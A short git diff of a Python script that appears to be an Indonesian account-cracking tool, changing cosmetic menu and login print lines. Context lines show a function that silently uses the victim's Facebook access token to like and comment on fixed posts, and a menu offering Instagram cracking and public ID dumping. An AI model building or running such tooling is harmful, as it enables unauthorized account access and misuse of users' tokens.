@@ -103,7 +103,8 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
 	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
 	requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
-	print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;97m]\x1b[1;92m Login Berhasil")
+	print("\x1b[1;92m║")
+	jalan("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;97m]\x1b[1;92m Login Berhasil")
 	menu()
 def publik():
         try:
@@ -283,6 +284,7 @@ def menu():
 	print("\x1b[1;92m╔══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name : "+nama)
 	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Ip   : "+ip)
 	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Org  : "+org)
+        print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Jnd  : "+durasi)
 	print("\x1b[1;92m║")
 	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;92m Crack Instagram (without login)")
 	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Dump ID Publik (dump fast)")
